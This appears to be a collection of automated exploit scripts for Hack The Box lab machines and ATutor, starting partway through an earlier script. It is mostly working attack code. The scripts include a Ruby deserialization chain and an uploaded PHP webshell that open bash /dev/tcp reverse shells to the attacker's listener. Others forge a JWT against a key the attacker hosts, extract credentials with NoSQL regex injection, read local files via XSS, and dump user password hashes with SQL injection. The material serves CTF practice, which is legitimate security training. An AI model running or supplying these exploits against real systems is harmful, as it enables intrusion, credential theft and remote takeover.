    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    args = parser.parse_args()

    lhost = args.ipaddress
    lport = args.port
    rhost = args.target

    '''Here we call the functions'''
    # Set up the web python server
    webServer()
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Let's mount the ps1 nishang
    mountPayload(lhost,lport)
    # Create the json payload
    createPayload(lhost)
    # Send the payload
    sendPayload(rhost,payload)

if __name__ == '__main__':
    main()
```

### Jewel
#### auto_rev.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto Ruby Deserealizaiton Exploit - Jewel HackTheBox
# Date: 16/09/21
import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
import os
from bs4 import BeautifulSoup
import urllib.parse
import json

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target)
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Create the payload
def createPayload(lhost,lport):
    print("[+] Let's mount the ruby payload !! [+]")
    payload = "require 'erb'\n"
    payload += "require 'uri'\n"
    payload +="require 'active_support'\n"
    payload +="require 'active_support/core_ext'\n"
    payload +="code = '`/bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\"`'\n" %(lhost,lport)
    payload +="erb = ERB.allocate\n"
    payload +="erb.instance_variable_set :@src, code\n"
    payload +="erb.instance_variable_set :@filename, '1'\n"
    payload +="erb.instance_variable_set :@lineno, 1\n"
    payload +="payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)\n"
    payload +="puts URI.encode_www_form(payload: payload)"
    f = open("exploit.rb", "w")
    f.write(payload)
    f.close()
    print("[+] Let's execute the ruby script !! [+]")
    global pay_reverse
    pay_reverse = os.popen('ruby exploit.rb').read().strip()[+8:]
    
# Function to get the CSRF TOKEN
def getCSRFToken(rhost):
    # Make csrfMagicToken global
    global csrf_token
    # Make the request to get csrf token
    login_url = 'http://' + rhost + ':8080'
    csrf_page = r.get(login_url, verify=False, proxies=proxies)
    # Get the index of the page, search for csrfMagicToken in it
    index = csrf_page.text.find("csrf-token")
    # Get only the csrfMagicToken in it
    csrf_token = csrf_page.text[index:index+128].split('"')[2]
    return csrf_token
    
# Function to get user ID profile
def getUserId(rhost):
    # Make csrfMagicToken global
    global userid
    # Make the request to get csrf token
    login_url = 'http://' + rhost + ':8080'
    userid_page = r.get(login_url, verify=False, proxies=proxies)
    # Get the index of the page, search for csrfMagicToken in it
    index = userid_page.text.find("users")
    # Get only the csrfMagicToken in it
    userid = userid_page.text[index:index+20].split('"')[0].split('/')[1]
    
# Function to create a user to be exploited on the server
def createUser(rhost):
    url = "http://%s:8080/users" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    getCSRFToken(rhost)
    data = {"utf8": "\xe2\x9c\x93", "authenticity_token": "%s" %csrf_token, "user[username]": "0x4rt3mis", "user[email]": "0x4rt3mis@email.com", "user[password]": "123456", "commit": "Create User"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    
# Function to login
def loginRequest(rhost):
    print("[+] Let's login !! [+]")
    url = "http://%s:8080/login" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    getCSRFToken(rhost)
    data = {"utf8": "\xe2\x9c\x93", "authenticity_token": "%s" %csrf_token, "session[email]": "0x4rt3mis@email.com", "session[password]": "123456", "commit": "Log in"}
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies, allow_redirects=True)
    print("[+] Logged in, let's procced !!!! [+]")
    
# Now let's login and send the payload
def sendPayload(rhost,lhost,lport):
    print("[+] Now, let's send the payload !!! [+]")
    # Let's get the userid to change it
    getUserId(rhost)
    # Let's change it and get the reverse shell
    csrf_rhost= "http://" + rhost + ":8080" + "/users/" + userid + "/edit"
    response = r.get(csrf_rhost, proxies=proxies, cookies=r.cookies)
    soup = BeautifulSoup(response.text, 'lxml')
    csrf_token_id = soup.select_one('meta[name="csrf-token"]')['content']
    # Now let's change it
    csrf_token_id_url = urllib.parse.quote(csrf_token_id, safe='')
    rhost = "http://" + rhost + ":8080" + "/users/" + userid
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data_pay = '_method=patch&authenticity_token=' + csrf_token_id_url + '&user%5Busername%5D=' + pay_reverse + '&commit=Update+User'
    r.post(rhost, headers=headers, cookies=r.cookies, data=data_pay, proxies=proxies)
    print("[+] Now, just trigger it!!!! [+]")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.ipaddress
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Let's create the payload
    createPayload(lhost,lport)
    # Let's create the user
    createUser(rhost)
    # Let's login
    loginRequest(rhost)
    # Now let's send the payload
    sendPayload(rhost,lhost,lport)
    # Trigger
    loginRequest(rhost)

if __name__ == '__main__':
    main()
```

### Telnet
#### auto_deserialization_RCE.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto PHP Serialization Exploit Reverse Shell - Tenet HackTheBox
# Date: 15/09/21
import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Set the handler up
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target)
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Sending the malicious function to the server
'''
Script in php which generated the malicious serialized object

<?php
class DatabaseExport {
  public $user_file = '0x4rt3mis.php';
  public $data = '<?php system($_REQUEST["cmd"]); ?>';
  }
print serialize(new DatabaseExport);
?>

Which generated - O:14:"DatabaseExport":2:{s:9:"user_file";s:13:"0x4rt3mis.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
'''
def sendMalicious(rhost):
    print("[+] Let's send the malicious serialized object !!!! [+]")
    url = "http://" + rhost + ":80/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A13%3A%220x4rt3mis.php%22%3Bs%3A4%3A%22data%22%3Bs%3A34%3A%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D"
    r.get(url, proxies=proxies)
    print("[+] Object written to %s/0x4rt3mis.php !!!! [+]" %rhost)

# Now, let's get the reverse shell easily
def getReverse(rhost, lhost, lport):
    print("[+] Let's get the reverse shell !!!! [+]")
    url = "http://%s:80/0x4rt3mis.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"cmd": "/bin/bash -c 'bash -i > /dev/tcp/%s/%s 0>&1'" %(lhost,lport)}
    r.post(url, headers=headers, data=data, proxies=proxies)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.ipaddress
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Send the malicious
    sendMalicious(rhost)
    # Get the reverse shell
    getReverse(rhost, lhost, lport)

if __name__ == '__main__':
    main()
```

### Mango
#### auto_noSQLi.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# NOSQL User and Passwod Exfiltrate - Mango HackTheBox
# Date: 13/09/21
import argparse
import requests
import sys
import string

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
def userExtract(rhost):
    url = "http://%s" %rhost
    global username
    username = ""
    password = ""
    list = string.ascii_letters
    iterator = 0
    while(iterator < len(list)):
        for c in list[iterator]:
            payload = {
                "username[$regex]": "^"+username+c,
                #"username[$regex]": "^(?!admin)"+username+c,
                "password[$ne]": password
            }
            r = requests.post(url, data=payload, allow_redirects=False, proxies=proxies)
            if r.status_code == 302:
                print(f"[+] Found one more char : {username+c}")
                username += c
                iterator = 0
            else:
                iterator = iterator + 1
    print("[+] Username Fouuuund!! : %s [+]" %username)

# Function to extract the password from the user
def passExtract(rhost,username):
    url = "http://%s" %rhost
    password = ""
    list = string.printable
    iterator = 0
    while(iterator < len(list)):
        for c in list[iterator]:
            # We skip characters that will be interpreted as regex
            if c in ['*', '+', '.', '?', '|', '$']:
                iterator = iterator + 1
                continue
            payload = {
                "username": username,
                "password[$regex]": "^"+password+c
            }
            r = requests.post(url, data=payload, allow_redirects=False, proxies=proxies)
            if r.status_code == 302:
                print(f"[+] Found one more char : {password+c}")
                password += c
                iterator = 0
            else:
                iterator = iterator + 1
    print("[+] Password Fouuuuund!!!!! : %s [+]" %password)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target
    '''Here we call the functions'''
    # Let's exfiltrate the admin user
    userExtract(rhost)
    # Let's get the password
    passExtract(rhost,username)
if __name__ == '__main__':
    main()
```

### TheNoteBook
#### auto_rce.py

```python
#!/usr/bin/python3
# Date: 2021-10-13
# Exploit Author: 0x4rt3mis
# Hack The Box - TheNotebook
# Auto forge JWT, malicious php upload and reverse shell automated
import argparse
import requests
import sys
import socket, telnetlib3
from threading import Thread
import threading
import http.server
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
import base64
import urllib.parse
import jwt #pip3 install pyjwt
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Set the handler to receive the reverse shell back
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport)
    t = telnetlib3.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target)
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# First we need to create a simple user
def createUser(rhost):
    print("[+] Let's create the user !! [+]")
    url = "http://%s:80/register" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "email": "0x4rt3mis@email.com"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] User created !! [+]")
    
# Now let's just login to get the token
def loginUser(rhost):
    print("[+] Let's log in as 0x4rt3mis !! [+]")
    url = "http://%s:80/login" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    r.get(url)
    global cookie
    cookie = r.cookies.get_dict()
    cookie = cookie['uuid']

# Now let's create the token
def createToken(lhost):
    print("[+] Let's create the malicious jwt token !! [+]")
    print("[+] Let's creat the key.key !! [+]")
    os.system("openssl genrsa -out key.key 2048 2>/dev/null")
    print("[+] Openssl Key Created !!! [+]")
    private_key = open("key.key", "r")
    private_key = private_key.read().rstrip()
    global encoded
    encoded = jwt.encode(
            {"username": "0x4rt3mis",
            "email":"0x4rt3mis@email.com",
            "admin_cap":"1"},
            private_key,
            algorithm="RS256",
            headers={"kid": "http://%s/key.key" %lhost,
            "typ":"JWT"},
    )

# Let's change the token
def changeToken(rhost,cookie,encoded):
    print("[+] Let's change the token !! [+]")
    url = 'http://%s:80/' %rhost
    r.cookies.clear()
    r.get(url, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    print("[+] Token Changeeed!!! [+]")

# Upload file in python
def adminUpload(rhost):
    url = "http://%s/admin/upload" %rhost
    os.system('echo "<?php system(\$_REQUEST[\\"cmd\\"]); ?>" > 1.php')
    files = {'file':('1.php', open('1.php', 'rb'))}
    upload = r.post(url, files=files, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    os.system('rm 1.php')
    global php_file
    upload = r.get(url, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    index = upload.text.find("Your Files")
    # Get only the php in it
    php_file = upload.text[index:index+150].split('.php')[0]
    php_file = php_file.split('>')[-1]
    
# Now trigger the reverse shell
def getReverse(rhost,lhost,lport,cookie,php_file):
    print("[+] Now Let's get the reverse shell! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    message_bytes = reverse.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    payload = {
    'cmd': 'echo ' + base64_message + '|base64 -d | bash'
}
    payload_str = urllib.parse.urlencode(payload, safe='|')
    url = "http://%s:80/%s.php?" %(rhost,php_file)
    r.get(url, params=payload_str, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.ipaddress
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Lets create the user
    createUser(rhost)
    # Login and grab the auth token
    loginUser(rhost)
    # Create jwt token
    createToken(lhost)
    # changeToken
    changeToken(rhost,cookie,encoded)
    #Upload the php
    adminUpload(rhost)
    # Get the rev shell
    getReverse(rhost,lhost,lport,cookie,php_file)
if __name__ == '__main__':
    main()
```

### The Book
#### auto_lfi.py

```python
#!/usr/bin/python3
# Date: 2021-10-12
# Exploit Author: 0x4rt3mis
# Hack The Box - Book
# Get auto LFI on the server
# OBS: to parse the pdf you need to install tika
# pip install tika
# Wait 1 minute to clean the XSS
import argparse
import requests
import sys
import os
from tika import parser

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# First let's trigger the sql truncation
def adminBook(rhost):
    url = "http://%s:80/index.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"name": "0x4rt3mis", "email": "admin@book.htb      .", "password": "123456"}
    r.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=True)

# Now let's login as admin@book.htb
def loginAdminUpload(rhost,file):
    url = "http://%s:80/index.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"email": "admin@book.htb", "password": "123456"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    #Once logged in, let's upload the malicious payload
    os.system('echo "aa" > 1.html')
    url = 'http://%s:80/collections.php' %rhost
    data = {'title':'<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file://%s");x.send();</script>' %file, 'author':'0x4rt3mis', 'Upload':'Upload'}
    files = {'Upload':('1.html', open('1.jpg', 'rb'))}
    r.post(url, data=data, files=files, proxies=proxies)
    os.system('rm 1.html')

def readFileLFI(rhost):
    # Login on admin panel
    url = "http://%s:80/admin/" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"email": "admin@book.htb", "password": "123456"}
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
    # Now, let's donwload and parse the pdf
    url = "http://%s/admin/collections.php?type=collections" %rhost
    resp = r.get(url, cookies=r.cookies, proxies=proxies)
    pdf = parser.from_buffer(resp.content)
    print(pdf['content'].strip())

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-f', '--file', help='File to be read', required=False)
    args = parser.parse_args()

    rhost = args.target
    file = args.file

    '''Here we call the functions'''
    # Let's trigger the SQL Truncation
    adminBook(rhost)
    # Let's upload the malicious file
    loginAdminUpload(rhost,file)
    # Let's read the file
    readFileLFI(rhost)

if __name__ == '__main__':
    main()
```

### RedCross
#### auto_sqli.py
```python
#!/usr/bin/python3
# Date: 2021-10-09
# Exploit Author: 0x4rt3mis
# Hack The Box - RedCross
# SQLInjection to Retrieve User Hashes
import argparse
import requests
import sys
import urllib3
import urllib

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
urllib3.disable_warnings()

'''Here come the Functions'''

# First, we need to create a user on the app, to get logged in and access the SQLInjection
def login(rhost):
    # Get the cookies
    url = "https://intra.%s.htb:443/?page=contact" %rhost
    headers = {"Referer": "https://intra.redcross.htb/?page=login"}
    r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, verify=False)
    # Now create a login fake
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"subject": "credentials", "body": "username=0x4rt3mis", "cback": "0x4rt3mis@email.com", "action": "contact"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)
    # Now, indeed login
    url = "https://intra.%s.htb:443/pages/actions.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": "guest", "pass": "guest", "action": "login"}
    r.post(url, headers=headers, data=data, proxies=proxies, cookies=r.cookies, allow_redirects=True, verify=False)

# Now let's exfiltrate it
def dataExfilDump(rhost):
    limit = 0
    columns = ['username','password']
    tables = ['users']
    while limit < 30:
        for table in tables:
            for column in columns:
                print("----")
                payload = urllib.parse.quote_plus("1') AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT %s FROM %s LIMIT %s,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -" %(column,table,limit))
                url = "https://intra.%s.htb:443/?o="%rhost + payload + "&page=app&page=app"
                exfil = r.get(url, cookies=r.cookies, proxies=proxies, verify=False, allow_redirects=True)
                if "Duplicate" in exfil.text:
                    index = exfil.text.find("DEBUG INFO")
                    data = exfil.text[index:index+128].split('\'')[1][:-1][1:]
                    print("[+] %s [+]!"%column)
                    print(data)
                    column = column[+1]
                else:
                    print("[+] Gooooot it !!! [+]")
                    return
            limit = limit +1

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-d', '--dump',choices=('True','False'), help='Chosse between True and False for DUMP auto - DEFAULT FALSE')
    args = parser.parse_args()

    global flag
    flag = args.dump == 'True'
    rhost = args.target

    '''Here we call the functions'''
    # Make the login request to get cookies
    login(rhost)
    # Test if flag is seted and starting the sqlinjection to retrieve data
    if flag:
        dataExfilDump(rhost)
        
if __name__ == '__main__':
    main()
```

### Atutor
#### sqli.py

```python
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print "(+) Retrieving database version...."

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print "\n(+) done!"

if __name__ == "__main__":
    main()
```

